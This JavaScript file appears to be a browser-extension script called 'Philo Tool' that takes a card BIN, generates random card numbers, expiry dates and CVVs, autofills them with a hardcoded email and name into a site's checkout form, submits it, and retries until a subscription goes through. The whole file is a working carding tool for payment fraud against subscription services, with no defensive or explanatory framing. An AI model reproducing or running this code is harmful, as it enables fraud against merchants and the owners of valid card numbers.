(function () {
    let retryCount = 0; // Track the number of retries
    const maxRetries = 10; // Set a maximum number of retries to prevent infinite loops

    // Create the popup container
    const popupContainer = document.createElement("div");
    popupContainer.id = "popup-container";

    // Create the header
    const header = document.createElement("div");
    header.id = "popup-header";
    header.textContent = "Philo Tool";

    // Create the status message
    const statusMessage = document.createElement("div");
    statusMessage.id = "popup-status";
    statusMessage.textContent = "Idle";

    // Create BIN/Extrap input
    const binInput = document.createElement("input");
    binInput.type = "text";
    binInput.placeholder = "Enter BIN/Extrap";

    // Load saved BIN/Extrap on load
    chrome.storage.local.get(["bin"], (result) => {
        if (result.bin) {
            binInput.value = result.bin;
        }
    });

    // Create buttons
    const startButton = document.createElement("button");
    startButton.textContent = "Start";
    startButton.addEventListener("click", () => {
        const bin = binInput.value.trim();
        if (bin) {
            statusMessage.textContent = "Starting process...";
            retryCount = 0;
            processWithRetry(bin);
        } else {
            statusMessage.textContent = "Please enter BIN/Extrap.";
        }
    });

    const saveButton = document.createElement("button");
    saveButton.textContent = "Save";
    saveButton.addEventListener("click", () => {
        const bin = binInput.value.trim();
        if (bin) {
            chrome.storage.local.set({ bin }, () => {
                statusMessage.textContent = "BIN/Extrap saved.";
            });
        } else {
            statusMessage.textContent = "Please enter BIN/Extrap.";
        }
    });

    const stopButton = document.createElement("button");
    stopButton.textContent = "Stop";
    stopButton.addEventListener("click", () => {
        retryCount = maxRetries; // Stop retry loop
        statusMessage.textContent = "Process stopped.";
    });

    // Add elements to the popup
    popupContainer.appendChild(header);
    popupContainer.appendChild(binInput);
    popupContainer.appendChild(saveButton);
    popupContainer.appendChild(startButton);
    popupContainer.appendChild(stopButton);
    popupContainer.appendChild(statusMessage);

    // Append the popup to the body
    document.body.appendChild(popupContainer);

    // Function to generate card details
    function generateCard(bin) {
        const cardNumber = bin + Math.floor(1000000000 + Math.random() * 9000000000).toString();
        const expiryMonth = String(Math.floor(Math.random() * 12) + 1).padStart(2, "0");
        const expiryYear = String(new Date().getFullYear() + Math.floor(Math.random() * 5) + 1).slice(2);
        const cvv = String(Math.floor(Math.random() * 900) + 100);
        statusMessage.textContent = `Generated Card: ${cardNumber}, ${expiryMonth}/${expiryYear}, CVV: ${cvv}`;
        return { cardNumber, expiryMonth, expiryYear, cvv };
    }

    // Function to autofill and submit
    function autofillAndSubmit({ cardNumber, expiryMonth, expiryYear, cvv }, bin) {
        const emailField = document.querySelector("input[type='email']");
        const nameField = document.querySelector("input[name='name']");
        const cardField = document.querySelector("input[name='cardnumber']");
        const expiryField = document.querySelector("input[name='expirydate']");
        const cvvField = document.querySelector("input[name='cvv']");
        const submitButton = document.querySelector("button[type='submit']");

        // Autofill email and name
        if (emailField) {
            emailField.value = "songindian16@gmail.com";
        }
        if (nameField) {
            nameField.value = "—͟͟͞͞𝗣𝗛𝗜𝗟𝗢 𝗔𝗠𝗔𝗥";
        }

        // Autofill card details
        if (cardField && expiryField && cvvField) {
            cardField.value = cardNumber;
            expiryField.value = `${expiryMonth}/${expiryYear}`;
            cvvField.value = cvv;

            statusMessage.textContent = "Form autofilled successfully.";

            if (submitButton) {
                submitButton.click();
                statusMessage.textContent = "Form submitted. Waiting for response...";
                setTimeout(() => checkSubscriptionStatus(bin), 3000); // Wait 3 seconds and check status
            } else {
                statusMessage.textContent = "Submit button not found.";
            }
        } else {
            statusMessage.textContent = "Card fields not found.";
        }
    }

    // Function to check subscription status
    function checkSubscriptionStatus(bin) {
        const successIndicator = document.querySelector(".success-message"); // Replace with actual selector
        if (successIndicator) {
            statusMessage.textContent = "Subscription successful!";
            retryCount = maxRetries; // Stop retries
        } else {
            if (retryCount < maxRetries) {
                retryCount++;
                statusMessage.textContent = `Retrying (${retryCount}/${maxRetries})...`;
                const newCardDetails = generateCard(bin);
                autofillAndSubmit(newCardDetails, bin);
            } else {
                statusMessage.textContent = "Max retries reached. Process failed.";
            }
        }
    }

    // Function to handle retry process
    function processWithRetry(bin) {
        const cardDetails = generateCard(bin);
        autofillAndSubmit(cardDetails, bin);
    }
})();
